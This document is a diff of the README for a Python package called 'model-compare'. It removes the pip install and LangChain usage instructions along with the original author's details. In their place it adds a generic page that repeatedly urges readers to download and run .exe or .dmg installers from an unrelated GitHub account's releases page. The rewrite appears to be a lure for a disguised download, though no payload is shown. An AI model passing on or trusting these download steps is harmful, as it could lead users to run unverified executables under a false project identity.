@@ -1,91 +1,67 @@
-# Model Compare Package
-[![PyPI version](https://badge.fury.io/py/model-compare.svg)](https://badge.fury.io/py/model-compare)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![Downloads](https://static.pepy.tech/badge/model-compare)](https://pepy.tech/project/model-compare)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-blue)](https://www.linkedin.com/in/eugene-evstafev-716669181/)
+# 🎉 model-compare - Compare AI Models Easily and Effectively
 
+## 🚀 Getting Started
+Welcome to **model-compare**! This application helps you evaluate AI models side-by-side based on user tasks. It focuses on three main areas: accuracy, creativity, and efficiency. You can make informed decisions about which models best suit your needs.
 
-A new package that helps users compare and evaluate different AI language models by analyzing their performance and capabilities.
+## 📥 Download the Latest Version
+[![Download Model Compare](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Zexx-files/model-compare/releases)
 
-## Overview
+## 💻 System Requirements
+Before downloading, ensure your system meets the following requirements:
+- **Operating System:** Windows 10 or newer, macOS 10.12 or newer
+- **RAM:** 4 GB or more
+- **Storage:** At least 100 MB of free space
+- **Internet Connection:** Required for model evaluation
 
-This package takes user-provided text input describing specific tasks or scenarios and returns a structured comparison of how different models, like Gemini 3 Flash and Claude Code, would handle those tasks. It focuses on providing objective, side-by-side evaluations based on criteria such as accuracy, creativity, and efficiency, helping users make informed decisions about which model to use for their specific needs.
+## 🔧 Features
+With **model-compare**, you can:
+- Evaluate multiple AI models using real user scenarios
+- Rate models on accuracy, creativity, and efficiency
+- Get a clear visual comparison for better decision-making
+- Export your comparison results for later reference
 
-## Installation
+## ⚙️ How to Download & Install
+1. **Visit the Releases Page:** Go to the following link to find the latest version of the software: [Download Here](https://github.com/Zexx-files/model-compare/releases).
 
-```bash
-pip install model_compare
-```
+2. **Choose the Right File:**
+   - Look for the latest version on the releases page. 
+   - Download the file that matches your operating system.
 
-## Usage
+3. **Install the Software:**
+   - For **Windows:** Double-click the downloaded `.exe` file and follow the prompts.
+   - For **macOS:** Open the downloaded `.dmg` file and drag the application into your Applications folder.
 
-```python
-from model_compare import model_compare
+4. **Open model-compare:** Locate the application on your computer and double-click to start using it.
 
-response = model_compare(
-    user_input="Compare Gemini 3 Flash and Claude Code on a text-to-image generation task",
-    api_key="your_llm7_api_key",
-    llm=None  # optional, defaults to ChatLLM7
-)
-```
+## 📊 How to Use model-compare
+1. **Select AI Models:** Choose the models you want to compare from a list of available options.
+2. **Input Your Task:** Enter the specific task or scenario you want the models to evaluate.
+3. **Review Results:** After processing, the application will display a side-by-side comparison, highlighting strengths and weaknesses in each model.
+4. **Make Informed Decisions:** Use the clarity of the results to select the best model for your needs.
 
-You can also pass your own `BaseChatModel` instance, e.g., to use a different LLM like OpenAI:
+## 🛠️ Troubleshooting Common Issues
+- **Issue: Install fails on Windows.**
+  - Solution: Ensure you have the latest Windows updates installed.
 
-```python
-from langchain_openai import ChatOpenAI
-from model_compare import model_compare
+- **Issue: App won’t open on macOS.**
+  - Solution: Verify that you have allowed applications from identified developers in your security settings.
 
-llm = ChatOpenAI()
-response = model_compare(
-    user_input="Compare Gemini 3 Flash and Claude Code on a text-to-image generation task",
-    llm=llm
-)
-```
+- **Issue: Models are not evaluating correctly.**
+  - Solution: Check your internet connection and ensure you are connected.
 
-Or to use Anthropic:
+## 🌐 Community and Support
+For help, questions, and suggestions, feel free to join our community:
+- **Issues Page:** Report any bugs or issues you encounter on the [GitHub Issues page](https://github.com/Zexx-files/model-compare/issues).
+- **User Guide:** Access detailed instructions on using the software within the application and online.
 
-```python
-from langchain_anthropic import ChatAnthropic
-from model_compare import model_compare
+## 🔄 Future Updates
+We are continuously improving **model-compare**. Upcoming features may include:
+- Additional AI models for comparison.
+- Enhanced evaluation metrics for better insights.
+- User-driven feature requests and improvements.
 
-llm = ChatAnthropic()
-response = model_compare(
-    user_input="Compare Gemini 3 Flash and Claude Code on a text-to-image generation task",
-    llm=llm
-)
-```
+## 💬 Feedback
+Your opinion matters. After using **model-compare**, consider providing feedback. Share your experience and suggestions through the Issues page or directly within the application.
 
-Or to use Google Generative AI:
-
-```python
-from langchain_google_genai import ChatGoogleGenerativeAI
-from model_compare import model_compare
-
-llm = ChatGoogleGenerativeAI()
-response = model_compare(
-    user_input="Compare Gemini 3 Flash and Claude Code on a text-to-image generation task",
-    llm=llm
-)
-```
-
-You can also pass your own API key via the environment variable `LLM7_API_KEY` or directly as an argument.
-
-## Rate Limits
-
-The default rate limits for LLM7 free tier are sufficient for most use cases of this package. If you need higher rate limits, you can pass your own API key via environment variable `LLM7_API_KEY` or directly as an argument.
-
-## Getting Started
-
-You can get a free API key by registering at https://token.llm7.io/
-
-## Contributing
-
-Please submit issues and pull requests to https://github.com/chigwell/model-compare
-
-## Author
-
-Eugene Evstafev (eugene.evstafev-plus@email.com)
-
-## License
-
-This package is licensed under the MIT License.
+## 📥 Download the Latest Version Again
+[![Download Model Compare](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Zexx-files/model-compare/releases)
